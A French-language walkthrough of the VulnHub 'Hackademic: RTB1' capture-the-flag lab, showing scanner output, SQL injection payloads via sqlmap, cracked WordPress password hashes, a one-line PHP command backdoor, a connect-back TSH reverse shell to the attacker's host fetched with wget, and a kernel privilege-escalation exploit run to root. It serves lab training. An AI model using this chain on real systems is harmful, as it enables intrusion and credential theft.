# Solution du CTF Hackademic: RTB1

Introduction
------------

La challenge [Hackademic: RTB1](http://vulnhub.com/entry/hackademic_rtb1,17/) (toujours sur *VulnHub*) propose une image virtuelle *VMWare* d'un système Linux.  

L'objectif de ce CTF est de lire le contenu du fichier */root/key.txt*  

Le système n'a pas beaucoup de ports ouverts, ce qui réduit nos angles d'attaque :  

```plain
Nmap scan report for 192.168.1.62
Host is up (0.00022s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
| http-methods: Potentially risky methods: TRACE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_http-title: Hackademic.RTB1  
MAC Address: 00:0C:29:1B:87:E3 (VMware)
```

*Nmap* devine un Kernel Linux 2.6.  

Webploitation
-------------

Si on accède au site on a une page d'accueil avec un lien vers */Hackademic\_RTB1/*. Les pages sont en PHP et prennent des paramètres. Je lance [Wapiti](http://wapiti.sourceforge.net/) (parce que *Wapiti* c'est bien ;-) ) sans plus tarder :  

```plain
> ./bin/wapiti http://192.168.1.62/Hackademic_RTB1/
Wapiti-2.3.0 (wapiti.sourceforge.net)

 Note
========
Le scan a été sauvegardé dans le fichier /tmp/.wapiti/scans/192.168.1.62.xml
Vous pouvez l'utiliser pour lancer de futures attaques sans avoir à relancer le scan via le paramètre "-k"
[*] Chargement des modules :
         mod_crlf, mod_exec, mod_file, mod_sql, mod_xss, mod_backup, mod_htaccess, mod_blindsql, mod_permanentxss, mod_nikto, mod_delay

[+] Lancement du module exec
Une erreur HTTP 500 a été obtenue avec http://192.168.1.62/Hackademic_RTB1/
  Evil url: http://192.168.1.62/Hackademic_RTB1/?%3Benv
Une erreur HTTP 500 a été obtenue avec http://192.168.1.62/Hackademic_RTB1/
  Evil url: http://192.168.1.62/Hackademic_RTB1/?p=%3Benv
Une erreur HTTP 500 a été obtenue avec http://192.168.1.62/Hackademic_RTB1/
  Evil url: http://192.168.1.62/Hackademic_RTB1/?cat=%3Benv

[+] Lancement du module file
Une erreur HTTP 500 a été obtenue avec http://192.168.1.62/Hackademic_RTB1/
  Evil url: http://192.168.1.62/Hackademic_RTB1/?http%3A%2F%2Fwww.google.fr%2F%3F
Une erreur HTTP 500 a été obtenue avec http://192.168.1.62/Hackademic_RTB1/
  Evil url: http://192.168.1.62/Hackademic_RTB1/?feed=
Une erreur HTTP 500 a été obtenue avec http://192.168.1.62/Hackademic_RTB1/
  Evil url: http://192.168.1.62/Hackademic_RTB1/?p=http%3A%2F%2Fwww.google.fr%2F%3F
Une erreur HTTP 500 a été obtenue avec http://192.168.1.62/Hackademic_RTB1/
  Evil url: http://192.168.1.62/Hackademic_RTB1/?cat=http%3A%2F%2Fwww.google.fr%2F%3F

[+] Lancement du module sql
Une erreur HTTP 500 a été obtenue avec http://192.168.1.62/Hackademic_RTB1/
  Evil url: http://192.168.1.62/Hackademic_RTB1/?%BF%27%22%28
Une erreur HTTP 500 a été obtenue avec http://192.168.1.62/Hackademic_RTB1/
  Evil url: http://192.168.1.62/Hackademic_RTB1/?p=%BF%27%22%28
Injection MySQL dans http://192.168.1.62/Hackademic_RTB1/ via une injection dans le paramètre cat
  Evil url: http://192.168.1.62/Hackademic_RTB1/?cat=%BF%27%22%28

[+] Lancement du module xss
Faille XSS dans http://192.168.1.62/Hackademic_RTB1/ via une injection dans le paramètre cat
  Evil url: http://192.168.1.62/Hackademic_RTB1/?cat=%3Cscript%3EString.fromCharCode%280%2Cwjevynv26p%2C1%29%3C%2Fscript%3E

[+] Lancement du module blindsql
Une erreur HTTP 500 a été obtenue avec http://192.168.1.62/Hackademic_RTB1/
  Evil url: http://192.168.1.62/Hackademic_RTB1/?sleep%287%29%231
Une erreur HTTP 500 a été obtenue avec http://192.168.1.62/Hackademic_RTB1/
  Evil url: http://192.168.1.62/Hackademic_RTB1/?p=sleep%287%29%231

[+] Lancement du module permanentxss

Rapport
------
Un rapport a été généré dans le fichier /tmp/.wapiti/generated_report
Ouvrez /tmp/.wapiti/generated_report/index.html dans un navigateur pour voir ce rapport.
```

Un bon nombre d'erreurs 500 a été retourné. Une faille XSS a été trouvée mais ce qui nous intéresse vraiment c'est la faille SQL dans le paramètre *cat*.  

On enchaîne sur [SQLmap](http://sqlmap.org/) (je coupe l'output qui est trop long) :  

```plain
python sqlmap.py -u "http://192.168.1.62/Hackademic_RTB1/?cat=1" --dbms=mysql -p cat

sqlmap identified the following injection points with a total of 51 HTTP(s) requests:
---
Place: GET
Parameter: cat
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 6380=6380

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: cat=1 AND (SELECT 6274 FROM(SELECT COUNT(*),CONCAT(0x7166706571,(SELECT (CASE WHEN (6274=6274) THEN 1 ELSE 0 END)),0x7163637371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind
    Payload: cat=1 AND SLEEP(5)
---
[15:03:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 13 (Goddard)
web application technology: PHP 5.3.3, Apache 2.2.15
```

Bien, *SQLmap* voit bien comment injecter du SQL dans la paramètre. On va pouvoir lui passer des options supplémentaires pour obtenir certaines infos comme :  

* --current-user qui retourne 'root@localhost'
* --current-db qui retourne 'wordpress'
* --passwords qui nous retourne le hash 2eaec110380126d7 pour le user root

Malheureusement, l'option *--os-shell* ne fonctionne pas, les droits sur */var/www/html/* doivent être trop restreints.  

Avec les options de dump (comme *--dump-all* qui prends beaucoup de temps) on peut récupérer les tables MySQL.  

En l'occurence les pages vulnérables sont celles d'un vieux *WordPress 1.5.1.1*.  

Dans la table des utilisateurs ont trouve les passwords hashés en MD5, facilement cassables avec [MD5RDB](http://md5.noisette.ch/):  

NickJames 21232f297a57a5a743894a0e4a801fc3 admin  

JohnSmith b986448f0bb9e5e124ca91d3d650f52c PUPPIES  

GeorgeMiller 7cbb3252ba6b7e9c422fac5334d22054 q1w2e3  

TonyBlack a6e514f9486b83cb53d8d932f9a04292 napoleon  

JasonKonnors 8601f6e1028a8e8a966f6c33fcd9aec4 maxwell  

MaxBucky 50484c19f1afdaf3841a0d821ed393d2 kernel  

On teste les différents logins sur l'interface d'administration *Wordpress* et on obtient un accès satisfaisant avec l'utilisateur *GeorgeMiller*.  

En particulier il est possible d'éditer le contenu des modules PHP. On édite le fichier *wp-content/plugins/hello.php* et on peut l'appeler directement pour faire exécuter notre PHP.  

Un *phpinfo()* révèle une configuration banale avec peu de protections (*safe\_mode off*, pas de fonctions désactivées).  

On ajoute une backdoor PHP toute simple :  

```plain
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
```

Puis on compile un [TSH](http://packetstormsecurity.com/files/31650/tsh-0.6.tgz.html) en mode connect-back (à cause de la présence du firewall) que l'on peut rapatrier via wget.  

Pour compiler *TSH* en mode connect-back il faut éditer *tsh.h* et dé-commenter deux lignes, par exemple de cette façon :  

```c
#define CONNECT_BACK_HOST  "192.168.1.3"
#define CONNECT_BACK_DELAY 10
```

Après il faut lancer le client en mode connect-back sur notre machine (*./tsh cb*) puis le serveur via notre backdoor PHP (*./tshd*).  

On est sur une *Fedora 12* 32bits avec un kernel 2.6.31 (*Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux*)  
.

Voici un extrait du /etc/passwd :  

```plain
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
(...)
sshd:x:74:484:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
pulse:x:493:483:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
gdm:x:42:481::/var/lib/gdm:/sbin/nologin
p0wnbox.Team:x:500:500:p0wnbox.Team:/home/p0wnbox.Team:/bin/bash
mysql:x:27:480:MySQL Server:/var/lib/mysql:/bin/bash
```

The way to root
---------------

J'ai fouillé à la recherche d'une tâche mal définie dans *crontab*, les services et processus en cours ainsi que les programmes setuid, dossiers et fichiers world-writable, fichiers appartenant à *p0wnbox.Team* mais toujours sans résultats :(  

Il y a un serveur SMTP qui écoute derrière le firewall :  

220 localhost.localdomain ESMTP Sendmail 8.14.3/8.14.3; Sun, 30 Mar 2014 14:03:54 +0300  

On obtient aisément le mot de passe de la BDD :  

```plain
sh-4.0$ cat wp-config.php
<?php
// ** MySQL settings ** //
define('DB_NAME', 'wordpress');     // The name of the database
define('DB_USER', 'root');     // Your MySQL username
define('DB_PASSWORD', 'lz5yedns'); // ...and password
define('DB_HOST', 'localhost');     // 99% chance you won't need to change this value
```

MySQL tourne sous l'utilisateur mysql, l'utilisation d'un *INTO OUTFILE* ne semble pas prometteuse...  

Finalement je me suis rabattu sur un exploit pour le noyau ([Linux RDS Protocol Local Privilege Escalation](http://www.exploit-db.com/exploits/15285/) par *Dan Rosenberg*) :  

```plain
bash-4.0$ gcc -o rds rds.c 
bash-4.0$ ./rds
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
sh-4.0# id
uid=0(root) gid=0(root)
sh-4.0# cd /root
sh-4.0# cat key.txt
Yeah!!
You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)

$_d&jgQ>>ak\#b"(Hx"o<la_%

Regards,
mr.pr0n || p0wnbox.Team || 2011
http://p0wnbox.com
```

Pas sûr que ce soit ce que le créateur du CTF attendait comme manière d'atteindre le root mais ça fonctionne :p

*Published March 31 2014 at 20:11*